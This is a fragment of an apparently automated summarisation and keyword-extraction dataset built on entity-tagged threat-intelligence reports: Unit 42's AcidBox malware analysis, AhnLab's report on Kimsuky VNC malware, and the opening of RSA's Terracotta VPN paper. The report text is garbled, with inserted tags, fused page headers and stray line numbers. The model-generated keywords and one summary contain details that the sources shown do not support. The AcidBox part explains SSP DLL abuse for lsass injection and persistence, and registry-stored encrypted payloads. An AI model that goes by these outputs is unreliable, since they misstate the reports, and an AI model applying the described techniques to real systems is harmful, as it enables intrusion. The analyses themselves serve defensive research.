such as [ORG] Kerberos ( [ORG] kerberos.dll)url Rare Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizationsor [ORG] NTLM ( msv1_0.dll ) . You can abuse the [ORG] SSP interface for malware persistency and also for injection purposes . In order to maintain persistency , you have to put your SSP DLL into the [PRODUCT] Windows system directory and add the name of your [ORG] DLL to a certain registry value . Upon a system restart , your [ORG] DLL gets loaded into the Windows lsass.exe process and is executed . If you just want your SSP DLL to be injected into lsass.exe , you can call the API function AddSecurityPackage which triggers immediate loading . Of course , you need at least admin privileges for both of these methods . The [ORDINAL] first case of a malware abusing the [ORG] SSP interface was mentioned by [PERSON] Matt [PERSON] Graeber in [DATE] 2014 . Since then , this persistence and injection trick has become wider known , but it \u2019s still rarely used in malware . In case of the [CARDINAL] three [ORG] AcidBox SSP DLLs , they do n\u2019t make use of any security related operations , but purely abuse this interface for injection purposes and most likely also for persistence . The [CARDINAL] three SSPs have different file names that are similar to the standard packages provided in Windows ( msv1_0.dll , [NORP] pku2u.dll , [PERSON] wdigest.dll):msv1_1.dll ( SHA256 : pku.dll ( SHA256 : [PERSON] windigest.dll ( SHA256 : However , as we do n\u2019t have the component which installs the [ORG] SSP DLLs , we do n\u2019t know for sure . What we know is that the [ORG] SSP interface is used for injection into lsass.exe , as they check at the beginning whether the process path they \u2019re loaded into matches the oneurl [FAC] Rare [FAC] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizationswhich is embedded into every sample in the resource section ( C:\\WINDOWS\\SYSTEM32\\lsass.exe ) . This process path is contained in the resource 4097 which we describe later how it is hidden via steganography . The purpose of the [ORG] AcidBox SSP DLLs is to load the main worker module from a registry value contained in resource [CARDINAL] 256 of each sample . We do n\u2019t know how the main worker [ORG] DLL was stored in the registry , but we believe it was done by the same missing component which installed the [ORG] SSP DLLs . We also assume that the [CARDINAL] three SSP DLLs are from [CARDINAL] three different systems as one of those samples has a different registry key embedded . Also , as these modules are the only visible part on a system \u2014 with the main worker module being loaded remains encrypted in the registry \u2014 they likely differ in some way like their chosen file name . The main worker is stored in the registry encrypted within a data blob that contains various other metadata such as the CRC32 hash of the data blob or magic byte sequences which indicate different types of contained data . After the main worker [ORG] DLL gets decrypted by a SSP DLL from the registry via simply XORing the data with key 0xCA , it gets prepared to be loaded from memory . It does so by creating a thread for the module and uses the exported function [ORG] UpdateContext of the main worker as its start address . The main worker module then loads the unsigned malware driver via the [ORG] VirtualBox exploit and waits for commands from [CARDINAL] one or more components that we do n\u2019t have . These commands include the loading of additional payloads from the registry from kernel space via the driver or the installation of new [ORG] SSP DLLs . The main worker has [CARDINAL] 2 export functions named InitMainStartup and [ORG] UpdateContext . The following strings are present in cleartext : url [FAC] Rare [FAC] Malware [FAC] Repurposing [FAC] Turla [FAC] Group Exploit Targeted [NORP] Russian Organizations12345678910111213141516171819%s\\%s%s\\%s{%s}%s\\[[%s]]%s.dll%s%s%s.dll\\\\.\\PCIXA_CFGDEVInitEntryInitExitThe Magic Word!ntoskrnl.exentkrnntkrphal.dllntoskrnlntkrnlpa.exe%s%s%sGroupCountNextInstance20Root\\LEGACY_NULL\\0000212223242526The following additional strings are stack obfuscated : url [FAC] Rare [FAC] Malware [FAC] Repurposing [FAC] Turla [FAC] Group Exploit Targeted [NORP] Russian OrganizationsSeLoadDriverPrivilege%s\\%c*.dllSystem\\CurrentControlSet\\Control\\NtQueryInformationThreadBFE_Notify_Event_Microsoft\\Cryptographyntdll.dll\\Registry\\Machine\\SOFTWAREGlobal%s\\%sSecurity Packageskernel32.dllSOFTWARE\\Registry\\Machine\\MachineGuidntdll.dll12345678910111213141516171819There are also XOR - encoded [ORG] DLL and function names , which later get dynamically resolved and used:123456ntdll . [GPE] RtlGetVersionntdll . [GPE] ZwLoadDriverntdll . ZwUnloadDriverntdll . ZwQuerySystemInformationkernel32.DeviceIoControlkernel32.GetSystemDirectoryAurl [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizations78910111213141516171819ntdll . [ORG] RtlAnsiStringToUnicodeStringntdll . [ORG] ZwClosentdll . ZwCreateFilentdll . [GPE] ZwQueryInformationFilentdll . ZwReadFilentdll . [GPE] ZwWriteFilekernel32.GetSystemDirectoryAkernel32.GetSystemDirectoryWkernel32.BaseThreadInitThunkkernel32.LZDoneadvapi32.CryptAcquireContextAadvapi32.CryptGenRandomadvapi32.CryptReleaseContext20ntdll . [GPE] RtlRbInsertNodeEx2122232425262728293031323334ntdll . [PERSON] RtlRbRemoveNodentdll . [ORG] RtlAcquireSRWLockExclusiventdll . [ORG] RtlReleaseSRWLockExclusiventdll . RtlEnterCriticalSectionntdll . RtlPcToFileHeaderntdll . [GPE] RtlGetVersionntdll . [ORG] RtlUpcaseUnicodeCharntdll . [ORG] RtlAnsiStringToUnicodeStringntdll . [ORG] LdrLockLoaderLockntdll . LdrUnlockLoaderLockntdll . [PERSON] ZwClosentdll . ZwCreateSectionntdll . [DATE] ZwMapViewOfSectionntdll . ZwUnmapViewOfSectionurl [FAC] Rare [FAC] Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsAll the functionality is contained in the [CARDINAL] two export functions , while [ORG] DllMain does not contain any relevant code . What stands out is the extensive use of custom DWORD - size status codes throughout the code . Decompiled code example with status codes in result variable:12345678910111213141516171819 \u2026 if ( ! a1 || ! a2 || ! ( _ DWORD)v3 ) { result = [PERSON] 0xA0032B02;goto [PERSON] LABEL_45;}if ( strlen(a1 ) < = [CARDINAL] 1 ) goto LABEL_65;result = get_kernel32_path(a1 , & v43 , & v37 , & v41);if ( result ) goto [PERSON] LABEL_45;if ( ( unsigned int)v3 < 0x1C ) { LABEL_65 : result = 0xA0032B02;goto LABEL_45;}pBuffer = allocate_buffer(v13 , ( unsigned int)v3 , 0i64 , v11 , [CARDINAL] 0 , [CARDINAL] 1);buffer = pBuffer;20if ( ! [ORG] pBuffer ) [CARDINAL] 2122232425{LABEL_9 : result = [CARDINAL] 0xA0032B04;goto LABEL_45;}url Rare Malware Repurposing Turla Group Exploit Targeted [NORP] Russian Organizations26272829303132if ( memcpy_s(pBuffer , v3 , a2 , v3 ) ) { LABEL_11 : result = [CARDINAL] 0xA0032B06;goto LABEL_45;} \u2026 The main worker sample contains [CARDINAL] five icon resources with valid icons named [CARDINAL] 16 , [CARDINAL] 256 , [DATE] 4097 , [DATE] 8193 and [DATE] 12289 . The names indicate different icon resolutions , but the icons only differ in the encrypted data appended to them which can be considered as a form of steganography . This data is encrypted with a custom algorithm and additionally zlib compressed . The same method is used within the [ORG] SSP DLLs . A Python script for decryption and decompression can be found in the [NORP] Appendix . After decryption , the data blob has the following structure:123456789struct data_blob { DWORD marker ; // [PERSON] Marker bytes ( [CARDINAL] 0x9A65659A)DWORD crc32 ; // CRC32 value of decrypted or zlib [GPE] uncompressedbytesDWORD size ; // [PERSON] Size of decrypted or zlib uncompressed [ORG] bytesDWORD option ; // Information if data is encrypted or zlibcompressed ; [GPE] 0x1 = encrypted , 0x2 = zlib compressedchar data [ ] ; // Encrypted or zlib compressed data};The decrypted data is as follows . Resource 16:12System\\CurrentControlSet\\Control\\Class\\{4D36E97D - E325 - 11CE - BFC1 - 08002BE10318}\\0003\\DriverDataResource [CARDINAL] 256 : url [FAC] Rare [FAC] Malware [FAC] Repurposing [FAC] Turla [FAC] Group Exploit Targeted [NORP] Russian Organizations12System\\CurrentControlSet\\Control\\Class\\{4D36E96A - E325 - 11CE - BFC1 - 08002BE10318}\\0000\\DriverDataResources [CARDINAL] 16 and [CARDINAL] 256 are the Windows registry keys that contain the decryption key for the embedded driver in resource [DATE] 8193 and additional payloads that are likely going to be injected by the [ORG] AcidBox driver . Resource 4097:1 C:\\WINDOWS\\SYSTEM32\\lsass.exeThis resource contains the path of the process each sample uses to verify it is being loaded into the correct process . Resource 8193 contains the unsigned kernelmode payload driver , which is also encrypted with [ORG] RSA . The driver is realized as a kernelmode [ORG] DLL with [CARDINAL] two indicator \u2014 caught our attention . This little known fact can be found in the export directory and can be helpful for attributing malware samples . All of the [ORG] AcidBox samples contain gaps between the single exported function entries : Figure [CARDINAL] 4 . Export directories of [ORG] AcidBox samples with gaps between the export function entriesurl [FAC] Rare [FAC] Malware Repurposing Turla Group Exploit Targeted [NORP] Russian OrganizationsEvery AcidBox sample has a [PERSON] NumberOfFunctions value in the export directory that is bigger than the [ORG] NumberOfNames value . This is n\u2019t something unusual , as not every exported function has to have a name too . Unnamed functions can be also called by their ordinal values . What is uncommon , however , is that the function entries which are unnamed are also zeroed out , thus not used . This is the result when you use your own DEF file instead of _ _ declspec(dllexport ) to describe the attributes of your [ORG] DLL file . When you use a [ORG] DEF file , you can choose which ordinal your export function will have . This is not possible with _ _ declspec(dllexport ) as [ORG] the [ORG] Visual [ORG] Studio compiler always counts your functions starting from one . Using a [ORG] DEF file instead of _ _ declspec(dllexport ) has some advantages . You are able to export functions by ordinals and you can also redirect functions among other things . The disadvantage is that you have to maintain an additional file within your project . In the case of the [ORG] AcidBox samples , we can conclude a couple of things . [ORDINAL] First , the author uses a [ORG] DEF file , although he does n\u2019t make use of its advantages . This could indicate it \u2019s a habit of the author to use DEF files . [ORDINAL] Second , the function ordinals seem to be chosen in steps of [CARDINAL] two integers . A possible explanation could be that the unused ordinals were once used for functions too . And last , if we assume the author really has chosen to make [CARDINAL] two integer steps , then in the usermode DLLs , [CARDINAL] one export function was removed . We can see that ordinal [CARDINAL] 3 is unused , leaving a bigger gap than one integer . All this information can be useful for malware attribution . ConclusionA new advanced malware , dubbed [ORG] AcidBox , was used by an unknown threat actor in [DATE] 2017 that went undetected until now . It uses a known [ORG] VirtualBox exploit to disable [ORG] Driver [ORG] Signature [ORG] Enforcement in Windows , but with a new twist : While it \u2019s publicly known that [ORG] VirtualBox driver VBoxDrv.sys v1.6.2 is vulnerable and used by [PERSON] Turla , this new malware uses the same exploit but with a slightly newer [ORG] VirtualBox version . Sometimes , you are still able to find a technically interesting [PRODUCT] Windows malware that uses a new technique . This has become quite a rarity in [DATE] today \u2019s threat landscape where everything is either a copy of a copy of a copy or technically underwhelming . While [ORG] AcidBox does n\u2019t use any fundamentally new methods , it breaks the myth that only [ORG] VirtualBox VBoxDrv.sys 1.6.2 can be used for [ORG] Turla \u2019s exploit . Appending sensitive data as an overlay in icon resources , abusing the [ORG] SSP interface for persistence and injection and payload storage in the Windows registry puts it into the category of interesting malware . The samples we dubbed [ORG] AcidBox are only part of a bigger toolkit which we , unfortunately , could not identify . However , we provide [CARDINAL] two [GPE] Yara rules for detection and threat hunting . Additionally , if you happen to find an additional sample , or are even infected , you can use the provided Python script to extract the sensitive data appended to the icon resources . All of these can be found here at Unit 42 \u2019s GitHub repository.url [ORG] Rare [ORG] Malware Repurposing Turla Group Exploit Targeted Russian OrganizationsIf you have any further information about this threat , do n\u2019t hesitate to contact us . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected from this malware . Our threat prevention platform with [ORG] WildFire identifies this malware as malicious . AutoFocus customers can investigate this activity with the tag [PERSON] AcidBox . We would like to thank Dr. [PERSON] Web , Kaspersky , ESET and hFireF0X for their collaboration . IOCs [PERSON] Files in Windows system32 directory msv1_1.dllpku.dllwindigest.dllMutexes [ORG] Global\\BFE_Event_{xxxxxxxxxxxx \u2013 xxxx - xxxxxxxx - xxxxxxxx}Global\\{xxxxxxxxxxxx \u2013 xxxx - xxxxxxxx - xxxxxxxx}The malware takes the [ORG] MachineGuid stored in the registry and reshuffles the single characters alternating from the end to the beginning and vice versa in steps of [CARDINAL] two . For example , the [ORG] MachineGuid string a9982d3e - c859 - 4702 - c761 - df7eea468ade gets transferred into e9a86daeecf5\u201367c2 - 07419d87 - e34289da and appended to the above templates . Windows Registry HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Class\\{4D36E97D- E325 - 11CE - BFC1 - 08002BE10318}\\0003\\DriverData ( [PERSON] REG_BINARY type)HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Class\\{4D36E96A- E325 - 11CE - BFC1 - 08002BE10318}\\0000\\DriverData ( [PERSON] REG_BINARY [PERSON] type)HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Class\\{4D36E969- E325 - 11CE - BFC1 - 08002BE10318}\\0000\\DriverData ( REG_BINARY type)Sample Hashes Statement.url", "generated_text": "Palo Alto Networks; the Turla Group; Russian origins; the FSB; the kernelmode malware; the first publicly-defined case; DSE; the kernelmode malware; the first version; the second version; the unpatched vulnerability; the second version; the first version; the first version; the second version; the second version; the malware; the Alto malware; Android; 2017; the malware; a new sophisticated threat actor; a very rare malware; targeted attacks; the exploit; the kernelmode malware; the malware; the attacker; the note; the kernelmode malware; the exploit; the kernel; the malware; The Unknown Threat Actor; the threat actor; The malware; the architecture; a simple code; the rootkit.", "ref_text": "<START-1>The report analyzes a rare malware family called AcidBox that was used in targeted attacks against Russian organizations in 2017.  AcidBox abuses a vulnerability in VirtualBox drivers that was previously used by the Turla APT group. It exploits additional unpatched vulnerabilities to disable driver signature enforcement and load its unsigned kernel driver. The malware uses a modular toolkit including loader modules installed as credential providers and a main worker module loaded from the registry. The main worker uses the VirtualBox exploit to load the kernel driver which can execute additional payloads. Analysis of artifacts like the compiler, export functions, custom status codes, and encryption indicates an advanced threat actor created AcidBox. While links to Turla are solely due to the reused exploit, attribution remains unclear. The malware managed to stay undetected until 2019. Its complex coding and targeted use suggest it was crafted for stealthy attacks and may still be in use today. Yara rules, IOCs, and a decryption script are provided to detect AcidBox.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4985994397759105, "gpt3/lexical/rouge_rouge2": 0.16338028169014085, "gpt3/lexical/rouge_rougeL": 0.24089635854341737, "gpt3/lexical/rouge_rougeLsum": 0.24089635854341737, "gpt3_generated_text": ["The article discusses a rare malware known as AcidBox, which repurposes an exploit previously used by the Turla Group, a sophisticated threat actor with Russian origins believed to operate on behalf of the FSB. The malware targets Russian organizations by exploiting a vulnerability in the VirtualBox driver, specifically version 2.2.0, which was previously unknown to be vulnerable. The malware, named AcidBox, is complex and part of a larger toolset used in targeted attacks. The unknown threat actor behind AcidBox used a previously unknown malware family in 2017, with the malware's main worker module discovered in 2019. Despite similarities in the exploit used, it is believed that the unknown threat actor is not directly tied to Turla. Palo Alto Networks customers are protected from this threat, and the malware is identified as malicious by their threat prevention platform with WildFire. The article emphasizes the rarity and sophistication of AcidBox, suggesting that it is still likely in use today by an advanced threat actor for targeted attacks. The article provides details on the architecture and behavior of the malware, highlighting its complexity and the need for continued vigilance against such threats."]}, {"split_name": "test", "sample_id": "test_101", "prompt_text": "Extract the keywords: [ORG] VNC [ORG] Malware ( [PERSON] TinyNuke , TightVNC ) Used by [ORG] Kimsuky Groupasec.ahnlab.com/en/27346October [CARDINAL] 20 , [CARDINAL] 2021While monitoring [ORG] Kimsuky - related malware , the [ORG] ASEC analysis team has recently discovered that [PRODUCT] VNC malware was installed via AppleSeed remote control malware . [ORG] VNC , also known as [FAC] Virtual [FAC] Network [FAC] Computing , is a screen sharing system that remotely controls other computers . Similar to the commonly - used RDP , it is used to remotely access and control other systems . [ORG] Kimsuky group installs AppleSeed backdoor on the target system after the initial compromise , then additionally installs [ORG] VNC malware via AppleSeed to ultimately control the target system in a graphical environment . [CARDINAL] One of the [PRODUCT] VNC malware that is installed is TinyNuke.1 . [PERSON] TinyNuke ( [DATE] HVNC)TinyNuke , also known as Nuclear Bot , is a banking malware discovered in [DATE] 2016 , and it includes features such as [ORG] HVNC ( HiddenDesktop / [ORG] VNC ) , reverse [ORG] SOCKS4 proxy , and form grabbing . Due to its source code revealed in [DATE] 2017 , [PERSON] TinyNuke is used by various attackers , and the [ORG] HVNC feature is partially borrowed by other malware such as [ORG] AveMaria and BitRAT.Among the various features of [PRODUCT] TinyNuke that are being distributed , only the [ORG] HVNC feature is enabled . A difference between normal [ORG] VNC and [ORG] HVNC used by [PERSON] TinyNuke is that the user does not realize that the PC is infected and its screen is being controlled . The following shows the process tree when [ORG] HVNC is enabled.explorer.exe ( [ORG] PID : [CARDINAL] 3140 ) is the child process of explorer.exe ( [ORG] PID : [DATE] 2216 ) , and is found in the process tree . The attacker is able to control the screen via the new explorer.exe ( [ORG] PID : [CARDINAL] 3140 ) , and the GUI ( Graphical user interface ) of the process created while the attacker is controlling the target PC is not visible on the target PC screen . This type of [ORG] VNC remote access is called [PERSON] HVNC ( [ORG] Hidden [ORG] Virtual [ORG] Network Computing).Figure [CARDINAL] 1 . Process tree upon using [ORG] HVNCAnother characteristic is that it uses the reverse [ORG] VNC method . [ORG] VNC consists of a server and a client . It installs the [ORG] VNC server on the control target system , and the user who wishes to control the system remotely uses the [ORG] VNC client . It gains control of the [ORG] VNC client by going through the [ORG] VNC server installed on the remote control target system.1/6In a normal [ORG] VNC environment , it attempts to access the remote control target ( [ORG] VNC server ) via the [ORG] VNC client . However , HVNC of [ORG] TinyNuke attempts to access the client from the server with the reverse [ORG] VNC feature . This means that when HVNC of the infected system is run , the awaiting attacker accesses the designated [ORG] C&C server and uses the [ORG] VNC client ( server for [ORG] HVNC ) on the [ORG] C&C server to gain remote control . It is assumed that this is to bypass firewalls such as [PERSON] Reverse [PERSON] Shell that blocks internal access from the outside and to support communication in a private [ORG] IP environment . Figure [CARDINAL] 2 . Attacker \u2019s HVNC screenNote that [ORG] TinyNuke uses \u201c AVE_MARIA \u201d string for verification when establishing [ORG] HVNC communication between the server and the client . This means that when \u201c AVE_MARIA \u201d string is sent from the [ORG] HVNC client to the server , the server verifies the name , and [ORG] HVNC communication can be enabled if \u201c AVE_MARIA \u201d is correct.2/6Figure [CARDINAL] 3 . AVE_MARIA string used in HVNCThis is identical to that of [ORG] HVNC used by [ORG] Kimsuky group , however , recently there have been HVNCs using \u201c LIGHT \u2019s BOMB \u201d string.2 . [PERSON] TightVNC ( VNC)Another [PRODUCT] VNC malware distributed via AppleSeed backdoor is TightVNC . [PERSON] TightVNC is an open - source [ORG] VNC utility , and the attacker customizes it to use it . TightVNC can be regarded as a normal [ORG] VNC utility , but it is different in that it supports the reverse [ORG] VNC feature discussed earlier . Figure [CARDINAL] 4 . \u201c LIGHT \u2019S BOMB \u201d string used in place ofAVE_MARIATightVNC consists of tvnserver.exe , the server module , and tvnviewer.exe , the client module . In a normal environment , it installs tvnserver on the remote control target and accesses the target using tvnviewer in the user environment . In order to use the reverse [ORG] VNC feature , it runs tvnviewer as a listening mode on the client , then uses tvnserver that is installed as a service on the access target system to set the client address using controlservice and connect commands for access gain . [ORG] Kimsuky group distributes tvnserver , and it is customized so that the reverse [ORG] VNC feature can be used in the infected environment without installing a service . Simply running tvnserver will allow the attacker to access tvnviewer that operates on the [ORG] C&C server and gain control of the screen of the infected [DATE] system.3/6Figure [DATE] 5 . Reverse VNC communication using tvnviewer3 . ConclusionAs introduced in the previous blog post , [ORG] Kimsuky group uses AppleSeed to install Meterpreter , a different backdoor malware , and uses [PRODUCT] TinyNuke , TightVNC and RDP Wrapper for screen control . There is also evidence of the use of [PERSON] Mimikatz for account info - stealing . FeatureTool NameRemote ControlAppleSeed , [ORG] MeterpreterScreen ControlTinyNuke , TightVNC , RDP WrapperAccount Info - stealing [LAW] PowerkatzTable [LAW] 1 . Recently - found attack tools used by [ORG] Kimsuky groupKimsuky group \u2019s malware trend is being monitored constantly , and users need to take extra caution when opening attachments in emails from unknown sources and refrain from visiting TIP \u2019 to check related [ORG] IOC and detailed analysis information . Categories : [PERSON] Malware [PERSON] InformationTagged as : [ORG] HVNC , [ORG] Kimsuky , [PERSON] TightVNC , [PERSON] TinyNuke , VNC6/6", "generated_text": "the report; AppleSeed; VNC malware; TinyNuke; Nuclear Bot; 2016; the attacker; the screen; The process; the explorer.exe; process; explorer.exe; the GUI; the process; the user; the screen; the reverse VNC method; infection; data; IP; communications; the IP address; the VNC server; the remote control; the user; the target system; the email address; the victim; another system; AppleSeed; other systems; the HVNC malware; the target system.", "ref_text": "<START-1>The PDF document discusses the use of VNC (Virtual Network Computing) and its various malware variants in cyber attacks. The document highlights three main types of VNC malware: TinyNuke, TightVNC, and Kimsuky Group's variant. TinyNuke is a feature-rich VNC software that allows for remote control of infected systems. It uses the \"AVE_MARIA\" string for verification during communication between the server and client. However, an attacker can potentially gain control by using a modified version of the software called \"LIGHT's BOMB.\" TightVNC is another VNC malware distributed via AppleSeed backdoor. It supports reverse VNC communication, allowing attackers to remotely access and control infected systems without installing a service. Kimsuky Group has customized this malware to distribute it easily. Kimsuky Group's malware trend involves the use of AppleSeed to install Meterpreter, a different backdoor malware. They also use TinyNuke, TightVNC, and RDP Wrapper for screen control. The group has been observed using Mimikatz for account information stealing. Users are advised to be cautious when opening attachments from unknown sources and avoid visiting untrusted websites to protect themselves from these cyber attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5301204819277109, "gpt3/lexical/rouge_rouge2": 0.16363636363636364, "gpt3/lexical/rouge_rougeL": 0.2289156626506024, "gpt3/lexical/rouge_rougeLsum": 0.2289156626506024, "gpt3_generated_text": ["The report discusses the discovery of VNC malware being installed via the AppleSeed remote control malware by the Kimsuky group. The VNC malware includes TinyNuke, also known as Nuclear Bot, which was discovered in 2016 and features HVNC (HiddenDesktop/VNC) and reverse SOCKS4 proxy. TinyNuke enables the attacker to control the victim's screen without their knowledge, using the HVNC feature. Additionally, the malware uses the reverse VNC method, allowing the attacker to access the victim's system from a designated C&C server. Another VNC malware distributed via AppleSeed is TightVNC, which supports the reverse VNC feature. The report highlights the use of specific strings, such as \"AVE_MARIA\" and \"LIGHT'S BOMB,\" for verification and communication between the server and client. Overall, the report provides insight into the methods and features of VNC malware used by the Kimsuky group to gain remote control over target systems."]}, {"split_name": "test", "sample_id": "test_102", "prompt_text": "Extract the keywords: Enabler of Advanced Threat AnonymityAugust 4 , 2015RSA ResearchContent and liability disclaimerThis Research Paper is for general information purposes only , and should not be used as a substitute for consultation with professional advisors . [ORG] EMC has exercised reasonable care in the collecting , processing , and reporting of this information but has not independently verified , validated , or audited the data to verify the accuracy or completeness of the information . [ORG] EMC shall not be responsible for any errors or omissions contained on this Research Paper , and reserves the right to make changes anytime without notice . Mention of non - [ORG] EMC products or services is provided for informational purposes only and constitutes neither an endorsement nor a recommendation by [ORG] EMC . All [ORG] EMC and [ORDINAL] third - party information provided in this Research Paper is provided on an \" as is \" basis . [ORG] EMC [ORG] DISCLAIMS [ORG] ALL [ORG] WARRANTIES , EXPRESSED OR IMPLIED , WITH REGARD TO ANY INFORMATION ( INCLUDING ANY SOFTWARE , [ORG] PRODUCTS , OR SERVICES ) PROVIDED IN THIS RESEARCH PAPER , INCLUDING [LAW] THE [LAW] IMPLIED [LAW] WARRANTIES [LAW] OF [LAW] MERCHANTABILITY [LAW] AND [LAW] FITNESS [LAW] FOR [LAW] A [LAW] PARTICULAR [LAW] PURPOSE , AND NON - INFRINGEMENT . Some jurisdictions do not allow the exclusion of implied warranties , so the above exclusion may not apply to you . In no event shall [ORG] EMC be liable for any damages whatsoever , and in particular [ORG] EMC shall not be liable for direct , special , indirect , consequential , or incidental damages , or damages for lost profits , loss of revenue or loss of use , cost of replacement goods , loss or damage to data arising out of the use or inability to use any [ORG] EMC website , any [ORG] EMC product or service . This includes damages arising from use of or in reliance on the documents or information present on this Research Paper , even if [ORG] EMC has been advised of the possibility of such damagesCopyright \u00a9 2015 EMC Corporation . All Rights Reserved . Use , copying , and distribution of any [ORG] EMC software described in this publication requires an applicable software license . [ORG] RSA and the [ORG] RSA logo are registered trademarks or trademarks of [ORG] EMC [ORG] Corporation in [GPE] the [GPE] United [GPE] States and other countries . All other products and/or services referenced are trademarks of their respective companies . Published in the [GPE] USA . [DATE] August [DATE] 4 , 20152SUSPECTED NATION STATE SPONSORED CAMPAIGNS LEVERAGINGTERRACOTTA VPN LEVERAGED FOR PHISHING AND ATTEMPTEDEXECUTIVE SUMMARY [CARDINAL] 5 WHAT IS TERRACOTTA VPN ? [CARDINAL] 5 TERRACOTTA VPN COMPONENTS [CARDINAL] 6 BEHIND THE TERRACOTTA NODES 7 BEHIND TERRACOTTA NODES : THE VICTIMS 9 TERRACOTTA WINDOWS SERVER ENLISTMENT MODUS OPERANDI [CARDINAL] 9 THE ECONOMICS OF HACKING FOR A PROFIT 10 VPN NODES THAT DON\u2019T \u201c LOOK LIKE \u201d VPN NODES [CARDINAL] 11 WHO USES TERRACOTTA VPN ? [CARDINAL] 12 TERRACOTTA VPN [CARDINAL] 12 EXPLOITATION OF A DEFENSE CONTRACTOR 12 TERRACOTTA VPN BREAKDOWN [CARDINAL] 15 DETECTING NODE ENLISTMENT ACTIVITY [CARDINAL] 15 DETECTING NODE USE IN ATTACKS [CARDINAL] 15 DETECTING USE OF TERRACOTTA VPN RESOURCES [CARDINAL] 16 DETECTING TERRACOTTA ASSOCIATED MALWARE [CARDINAL] 16 [ORG] RSA ECAT [CARDINAL] 23 AND [ORG] ECAT [CARDINAL] 25 ATTRIBUTION AND PATTERN OF LIFE [CARDINAL] 32 CONCLUSIONS 33DETECTING TERRACOTTA ACTIVITY IN RSA SECURITY ANALYTICS ANDDETECTING TERRACOTTA MALWARE USING RSA SECURITY ANALYTICS3APPENDIX [CARDINAL] 33 AVAILABLE TO [ORG] INDUSTRY PARTNERS UPON REQUEST [CARDINAL] 33 AUTHORS [CARDINAL] 334EXECUTIVE [NORP] SUMMARYIn this report , [ORG] RSA [ORG] Research explores in depth a malware - supported [ORG] VPN network , known internally to [ORG] RSA as [ORG] Terracotta . Terracotta is an active launch - platform for [ORG] APT activities of [LAW] Shell_Crew / [ORG] DeepPanda and other [ORG] APT actors , used to obscure the origins of the threat actors \u2019 malicious activities . It is ensnaring a new class of victims ( legitimate commercial and government entities , unknowinly serving [ORG] VPN nodes and bandwith ) into larger - scale [ORG] APT cases . Fortunately , enlistment in the [GPE] Terracotta network is readily preventable by using well - established cybersecurity practices . Detection and mitigation for enlisted systems is also quite feasible . Terracotta is commercially marketed in [GPE] the People \u2019s [GPE] Republic [GPE] of [GPE] China ( [GPE] PRC ) under several different brand names . VPN services are quite marketable in [GPE] China as a means to anonymously traverse government internet censorship . Terracotta \u2019s malicious methods for acquiring nodes and theft of bandwidth likely derives substantial cost - savings for its operators . Having provided Terracotta VPN indicators to trusted partners , [ORG] RSA has received multiple reports of ( and since observed ) suspected nation - state sponsored campaign activity originating from [ORG] Terracotta [ORG] VPN [ORG] IP addresses . Targets appear to have included [NORP] Western governments and several commercial entities . By using [ORG] Terracotta [ORG] VPN , advanced threat actors appear to originate from seemingly benign sources . Blocking , restricting , or detecting by [ORG] IP address indicators is difficult because new nodes ( hosted in legitimate organizations ) are being continuously added . This report by [ORG] RSA [ORG] Research may represent the [ORDINAL] first exposure of a [GPE] PRC - based [ORG] VPN operation that maliciously , efficiently and rapidly enlists vulnerable servers around the world . It is the [ORDINAL] first time [ORG] RSA [ORG] Research has seen [LOC] Shell_Crew / [ORG] DeepPanda and other similar [ORG] APT actors using such networks for anonymization and obfuscation . [ORG] BACKGROUNDVirtual [ORG] Private [ORG] Networks ( VPN ) are very popular . They are part and parcel for almost every enterprise network , especially those with remote employees . Aside from VPNs for enterprises , there are many reputable commercial VPN services that offer low - cost , reliable service to individual users . These users employ VPNs for reasons that might include connection security , protection of private data , online gaming acceleration , and bypassing service provider restrictions . VPNs are also used by cyber criminals , as it allows them to obscure their true source location . When a commercial VPN service provider uses resources such as servers and copious bandwidth stolen or repurposed from unsuspecting victims for purposes of profit , analysis and reporting are in order . In this report , [ORG] RSA [ORG] Research exposes [CARDINAL] one such operator doing business with multiple [ORG] VPN brand names marketed primarily in [GPE] the People \u2019s [GPE] Republic [GPE] of [GPE] China ( [GPE] PRC ) . Operating with [CARDINAL] more [CARDINAL] than [CARDINAL] 1500 end nodes around the world , [ORG] RSA [ORG] Research has confirmed that [CARDINAL] at [CARDINAL] least [CARDINAL] thirty of the host systems are compromised Windows servers that were \u201c harvested \u201d without the victims \u2019 knowledge or permission . The operators behind [ORG] Terracotta [ORG] VPN continue their broad campaign to compromise multiple victim organizations around the world . [ORG] RSA [ORG] Research is reporting on the associated [ORG] VPN operator because:\u2022\u2022\u2022There is evidence of compromise of multiple victim organization systems around the world , There is evidence of illicit installation of software and malicious remote access tools on the victims \u2019 servers , andThere is evidence of theft of victims \u2019 resources and bandwidth to serve clients ( including advanced threat actors ) with a high - performance anonymity service . NOTE : There are [CARDINAL] two classes of victims described and referred to in this report . Most of the references to victims are of those unknowingly enlisted into the Terracotta VPN service , as outlined above . A [ORDINAL] second class of victims , [ORG] APT targets , have been targeted by other actors who are using [ORG] Terracotta for anonymization and obfuscation . Throughout this report , we specificly refer to [ORG] APT - victims accordingly , while leaving the generic \u2018 victim \u2019 designation for the [PERSON] Terracotta nodes . WHAT IS TERRACOTTA VPN?Terracotta [ORG] VPN is the name used by [ORG] RSA [ORG] Research to describe the dynamically - maintained conglomerate of multiple VPN \u201c brand \u201d names marketed on [LANGUAGE] Chinese - language websites . The websites are principally linked by common domain name registrant email addresses and are often hosted on the same infrastructure with the same basic web content.5TERRACOTTA VPN COMPONENTSThere are several high - level components to the Terracotta VPN system.\u2022 WEBSITES : The most visible [ORG] Terracotta [ORG] VPN components are the websites that market the service and the specific brands associated with Terracotta VPN . VPN users can download the software clients , obtain trial credentials , change credentials for their paid accounts , and add credit to paid accounts from these websites.\u2022\u2022\u2022CLIENT SOFTWARE : The client software is another common [ORG] Terracotta [ORG] VPN element . The client interfaces are skinned with images and logos consistent with their corresponding websites . The client software is principally developed by a legitimate software vendor , according to the application \u2019s file properties and indicative by the domains contacted by the client when the user logs - in . [ORG] CLIENT [ORG] SOFTWARE 